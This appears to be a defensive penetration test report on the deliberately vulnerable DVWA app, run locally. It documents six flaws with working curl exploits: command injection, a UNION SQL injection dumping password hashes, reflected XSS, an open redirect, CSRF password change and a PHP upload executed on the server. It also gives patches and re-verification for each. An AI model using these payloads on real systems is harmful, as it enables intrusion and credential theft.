# DVWA — Penetration Test Report (independent target)

**Target:** `http://127.0.0.1:4280` — [DVWA](https://github.com/digininja/DVWA)
("Damn Vulnerable Web Application"), a well-known third-party intentionally-
vulnerable PHP/MariaDB app, run at its **Low** security level (the level DVWA
itself describes as having "no security measures at all" — the closest match to
an unhardened vibe-coded app). Run locally via `docker compose`, authorized,
non-destructive.

**Date:** 2026-09-22
**Method:** black-box probing of the running app with `curl` against an
authenticated session (`admin` / `password`, DVWA's own documented default);
source read only to confirm root cause and to apply the fix, since patching
means editing the PHP directly. Every finding is proven with a live
request/response, then closed and re-verified against the exact same request.

Why this target: [`vampi`](../vampi) proved the loop on a third-party **API**;
DVWA is a third-party **web app** with a PHP/MariaDB stack the other two
examples don't touch, and it's the project's second independent-app proof
(tracked on the [roadmap](../../README.md#roadmap)).

**Result: 6 vulnerabilities proven; all closed and re-verified.** (Scope and
limits of that claim are spelled out [below](#scope-and-what-this-proof-does-not-claim).)

---

## Finding 1 — OS command injection (`vulnerabilities/exec/`)

- **Class:** Command injection
- **Severity:** Critical
- **Endpoint:** `POST /vulnerabilities/exec/`

The "ping a host" tool passes the `ip` field straight into a shell command. Any
shell metacharacter after it executes too.

### Exploit
```
$ curl -s -b $JAR -X POST http://127.0.0.1:4280/vulnerabilities/exec/ \
    --data-urlencode "ip=127.0.0.1 && id" --data-urlencode "Submit=Submit" \
    --data-urlencode "user_token=$TOKEN"

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
...
uid=33(www-data) gid=33(www-data) groups=33(www-data)          # HTTP 200
```

### Root cause & fix
```php
// vulnerabilities/exec/source/low.php
- $cmd = shell_exec( 'ping  -c 4 ' . $target );
+ if( !filter_var( $target, FILTER_VALIDATE_IP ) && !preg_match( '/^[a-zA-Z0-9.-]+$/', $target ) ) {
+     $html .= '<pre>Invalid IP address or hostname.</pre>';
+ } else {
+     $cmd = shell_exec( 'ping  -c 4 ' . escapeshellarg( $target ) );
+ }
```
Reject anything that isn't a bare IP/hostname *before* it reaches a shell, and
`escapeshellarg()` the value that does reach it — belt and suspenders.

### Re-verify
```
$ curl ... --data-urlencode "ip=127.0.0.1 && id" ...
<pre>Invalid IP address or hostname.</pre>                       # blocked
$ curl ... --data-urlencode "ip=127.0.0.1" ...
PING 127.0.0.1 ... 4 packets transmitted, 4 received, 0% packet loss  # legit use still works
```

---

## Finding 2 — SQL injection dumps every password hash (`vulnerabilities/sqli/`)

- **Class:** SQL injection
- **Severity:** Critical
- **Endpoint:** `GET /vulnerabilities/sqli/?id=...&Submit=Submit`

The `id` parameter is concatenated directly into the query, so a UNION payload
dumps the whole `users` table, including password hashes.

### Exploit
```
$ curl -s -b $JAR -G http://127.0.0.1:4280/vulnerabilities/sqli/ \
    --data-urlencode "id=1' UNION SELECT user, password FROM users-- -" \
    --data-urlencode "Submit=Submit"

ID: ...<br />First name: admin<br />Surname: admin
ID: ...<br />First name: admin<br />Surname: 5f4dcc3b5aa765d61d8327deb882cf99
ID: ...<br />First name: gordonb<br />Surname: e99a18c428cb38d5f260853678922e03
ID: ...<br />First name: 1337<br />Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
ID: ...<br />First name: pablo<br />Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
ID: ...<br />First name: smithy<br />Surname: 5f4dcc3b5aa765d61d8327deb882cf99   # HTTP 200
```
`5f4dcc3b5aa765d61d8327deb882cf99` is `md5('password')` — every account's
password is recovered.

### Root cause & fix
```php
// vulnerabilities/sqli/source/low.php
- $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
- $result = mysqli_query($GLOBALS["___mysqli_ston"], $query) or die(...);
+ $stmt = mysqli_prepare($GLOBALS["___mysqli_ston"], "SELECT first_name, last_name FROM users WHERE user_id = ?;");
+ mysqli_stmt_bind_param($stmt, "s", $id);
+ mysqli_stmt_execute($stmt);
+ $result = mysqli_stmt_get_result($stmt);
```
Parameterized query — `$id` can never break out of the string literal.
(The same file has a second copy of this query for the SQLite backend; it was
missed during the run and parameterized afterwards — see
[Post-merge review finding](#post-merge-review-finding).)

### Re-verify
```
$ curl ... --data-urlencode "id=1' UNION SELECT user, password FROM users-- -" ...
ID: 1' UNION SELECT user, password FROM users-- -<br />First name: admin<br />Surname: admin
```
One row, not six, and no password hash. (It matches `user_id=1` only because
MySQL coerces a string starting with `"1"` to the integer `1` for an int-column
comparison — the same behavior you'd get from `id=1abc`. The UNION clause is
inert: it's just part of the bound string now.) A plain `id=1` still returns
`admin`/`admin` as before — legitimate lookups are unaffected.

---

## Finding 3 — Reflected XSS (`vulnerabilities/xss_r/`)

- **Class:** Cross-site scripting
- **Severity:** High
- **Endpoint:** `GET /vulnerabilities/xss_r/?name=...`

`name` is echoed into the page with no encoding.

### Exploit
```
$ curl -s -b $JAR -G http://127.0.0.1:4280/vulnerabilities/xss_r/ \
    --data-urlencode 'name=<script>document.title="hackme-xss-proof"</script>'

<pre>Hello <script>document.title="hackme-xss-proof"</script></pre>   # HTTP 200, raw <script> in the DOM
```

### Root cause & fix
```php
// vulnerabilities/xss_r/source/low.php
- $html .= '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
+ $html .= '<pre>Hello ' . htmlspecialchars( $_GET[ 'name' ], ENT_QUOTES ) . '</pre>';
```

### Re-verify
```
$ curl ... --data-urlencode 'name=<script>...</script>'
<pre>Hello &lt;script&gt;document.title=&quot;hackme-xss-proof&quot;&lt;/script&gt;</pre>
```
Rendered as text, not markup — the payload no longer executes.

---

## Finding 4 — Open redirect (`vulnerabilities/open_redirect/`)

- **Class:** Open redirect
- **Severity:** Medium
- **Endpoint:** `GET /vulnerabilities/open_redirect/source/low.php?redirect=...`

The `redirect` parameter is sent straight to a `Location` header — a phishing
primitive hosted on a trusted domain.

### Exploit
```
$ curl -s -D - -o /dev/null "http://127.0.0.1:4280/vulnerabilities/open_redirect/source/low.php?redirect=https://evil.example.com/phish"

HTTP/1.1 302 Found
location: https://evil.example.com/phish            # sends the browser off-site
```

### Root cause & fix
```php
// vulnerabilities/open_redirect/source/low.php
- if (array_key_exists ("redirect", $_GET) && $_GET['redirect'] != "") {
-     header ("location: " . $_GET['redirect']);
+ $allowed_redirects = array( 'info.php?id=1', 'info.php?id=2' );
+ if (array_key_exists ("redirect", $_GET) && in_array($_GET['redirect'], $allowed_redirects, true)) {
+     header ("location: " . $_GET['redirect']);
```
Allow-list of the page's own known destinations — never the raw client value.

### Re-verify
```
$ curl ... "?redirect=https://evil.example.com/phish"
HTTP/1.1 500 Internal Server Error                    # blocked
$ curl ... "?redirect=info.php?id=1"
HTTP/1.1 302 Found
location: info.php?id=1                                # legit use still works
```

---

## Finding 5 — CSRF on password change (`vulnerabilities/csrf/`)

- **Class:** Cross-site request forgery
- **Severity:** High
- **Endpoint:** `GET /vulnerabilities/csrf/?password_new=...&password_conf=...&Change=Change`

Changing the logged-in user's password is a plain `GET` with **no anti-CSRF
token and no Referer check** — any page the victim's browser loads while
authenticated can silently change their password.

### Exploit
```
$ curl -s -b $JAR "http://127.0.0.1:4280/vulnerabilities/csrf/?password_new=hackme123&password_conf=hackme123&Change=Change#"
<pre>Password Changed.</pre>                                        # HTTP 200, no token sent
$ curl -s -X POST http://127.0.0.1:4280/login.php --data-urlencode "username=admin" \
    --data-urlencode "password=hackme123" --data-urlencode "Login=Login" ...
HTTP/1.1 302 Found
Location: index.php                                                # new password works — takeover proven
```
(Reverted immediately to the original password as part of the same test —
throwaway credential, no data destroyed.)

### Root cause & fix
DVWA already ships anti-CSRF-token helpers (`checkToken()` /
`generateSessionToken()` / `tokenField()`) — Low just never wires them in.
```php
// vulnerabilities/csrf/source/low.php
if( isset( $_GET[ 'Change' ] ) ) {
+     checkToken( $_REQUEST[ 'user_token' ] ?? '', $_SESSION[ 'session_token' ], 'index.php' );
      $pass_new  = $_GET[ 'password_new' ];
      ...
}
+ generateSessionToken();

// vulnerabilities/csrf/index.php — render the token field on Low too
- if( $vulnerabilityFile == 'high.php' || $vulnerabilityFile == 'impossible.php' )
+ if( $vulnerabilityFile == 'low.php' || $vulnerabilityFile == 'high.php' || $vulnerabilityFile == 'impossible.php' )
      $page[ 'body' ] .= "			" . tokenField();
```

### Re-verify
```
$ curl -s -b $JAR "...?password_new=shouldfail&password_conf=shouldfail&Change=Change#"
HTTP/1.1 302 Found
Location: index.php                                    # rejected — "CSRF token is incorrect"
```
`admin`'s password hash in the database is unchanged
(`5f4dcc3b5aa765d61d8327deb882cf99`, i.e. still `password`) after the forged
request. Submitting the change from the app's own form (with its token) still
returns `Password Changed.`

---

## Finding 6 — Unrestricted file upload → remote code execution (`vulnerabilities/upload/`)

- **Class:** Unrestricted upload
- **Severity:** Critical
- **Endpoint:** `POST /vulnerabilities/upload/`

The upload form saves whatever file is sent, under its original name, into a
directory served by Apache — no extension, MIME, or content check.

### Exploit
```
$ echo '<?php echo "hackme-upload-proof-9f31c2"; ?>' > proof.php
$ curl -s -b $JAR -X POST http://127.0.0.1:4280/vulnerabilities/upload/ \
    -F "uploaded=@proof.php;type=application/x-php" -F "Upload=Upload" -F "user_token=$TOKEN"
<pre>../../hackable/uploads/proof.php succesfully uploaded!</pre>   # HTTP 200

$ curl -s http://127.0.0.1:4280/hackable/uploads/proof.php
hackme-upload-proof-9f31c2                                          # the PHP executed server-side
```
(Removed immediately after proving execution — no backdoor left in place.)

### Root cause & fix
```php
// vulnerabilities/upload/source/low.php
+ $uploaded_ext = strtolower( substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1 ) );
+ if( !in_array( $uploaded_ext, array( 'jpg', 'jpeg', 'png' ), true ) ||
+     $_FILES[ 'uploaded' ][ 'size' ] >= 100000 ||
+     !getimagesize( $_FILES[ 'uploaded' ][ 'tmp_name' ] ) ) {
+     $html .= '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
+ } else if( !move_uploaded_file( ... ) ) { ...
```
Allow-listed extension **and** a real image header (`getimagesize()`), so a
`.php` file — spoofed `Content-Type` or not — is rejected before it ever
reaches the uploads folder.

### Re-verify
```
$ curl ... -F "uploaded=@proof.php;type=application/x-php" ...
<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>   # blocked
$ curl http://127.0.0.1:4280/hackable/uploads/proof.php
HTTP/1.1 404 Not Found
$ curl ... -F "uploaded=@tiny.png;type=image/png" ...
<pre>../../hackable/uploads/tiny.png succesfully uploaded!</pre>                # legit image still works
```

---

## Scope, and what this proof does *not* claim

Stated plainly, because the [VAmPI proof](../vampi/HACKME_REPORT.md) is a
stronger claim than this one and the two shouldn't be read as equivalent:

- **This is not blind discovery.** DVWA's own navigation menu lists its
  vulnerability categories by name, and its docs describe each one. An agent
  pointed at it can read the menu. VAmPI is the proof that the *find* step works
  on an app that doesn't announce its bugs; DVWA is the proof that
  **prove → patch → re-verify** works on a different stack — server-rendered
  PHP/MariaDB with forms, cookies and `Location` headers instead of a JSON API.
  Both halves of the loop matter; only one of them is being demonstrated here.
- **Six of DVWA's nineteen modules.** Covered: `exec`, `sqli`, `xss_r`,
  `open_redirect`, `csrf`, `upload`. Not touched in this run: `api`,
  `authbypass`, `bac`, `brute`, `captcha`, `cryptography`, `csp`, `fi`,
  `javascript`, `sqli_blind`, `weak_id`, `xss_d`, `xss_s`. "6 found" means six
  proven and closed, not a clean bill of health for the app.
- **Low security level only.** DVWA's Medium/High levels are deliberately
  *partial* fixes designed to be bypassed; they're a different exercise.
- **One configuration.** MySQL/MariaDB, Apache, the stock `compose.yml`.

### Post-merge review finding

Reviewing this report after merge turned up a miss the run itself didn't catch:
`vulnerabilities/sqli/source/low.php` contains **two** copies of the same
injection — one per database backend — and only the `case MYSQL:` branch was
parameterized. The `case SQLITE:` branch still concatenated `$id`, so anyone
running DVWA with `$_DVWA['SQLI_DB'] = SQLITE` would have applied the patch and
stayed injectable. Now fixed in `patches/` with a bound `SQLite3` statement.

It's recorded here rather than quietly corrected because it's the failure mode
this project keeps pointing at: a fix verified against *the request you sent*
can still leave the same bug live on a path you didn't exercise. Re-verification
proves the exploit is dead, not that the class is gone.

## Summary

| # | Finding | Class | Severity | Status |
|---|---------|-------|:--:|:--:|
| 1 | Ping tool executes arbitrary shell commands | Command injection | Critical | **fixed** → validated + `escapeshellarg` |
| 2 | `id` param dumps every password hash | SQL injection | Critical | **fixed** → parameterized query |
| 3 | `name` param injects live `<script>` | Reflected XSS | High | **fixed** → `htmlspecialchars` |
| 4 | `redirect` param sends users off-site | Open redirect | Medium | **fixed** → destination allow-list |
| 5 | Password change has no CSRF token | CSRF | High | **fixed** → token checked, wired to Low |
| 6 | Upload accepts and executes `.php` | Unrestricted upload | Critical | **fixed** → extension + image-header check |

All six were re-verified against the exact original requests after the fix, and
every legitimate happy path (valid ping, `id=1` lookup, in-app password change,
JPEG/PNG upload, `info.php?id=1` redirect) still returns `200`/`302` as before.

### Reproduce

```bash
git clone https://github.com/digininja/DVWA && cd DVWA
cp config/config.inc.php.dist config/config.inc.php
# uncomment the "volumes: - ./:/var/www/html" lines in compose.yml to serve local source
docker compose up -d                       # http://127.0.0.1:4280
# visit /setup.php once to create the DB, then log in admin / password
# Settings → DVWA Security → Low
# then run /hack-me against http://127.0.0.1:4280 (see ../../commands/hack-me.md)
```
Same guardrails as always: your own / authorized target, localhost only,
non-destructive proofs.
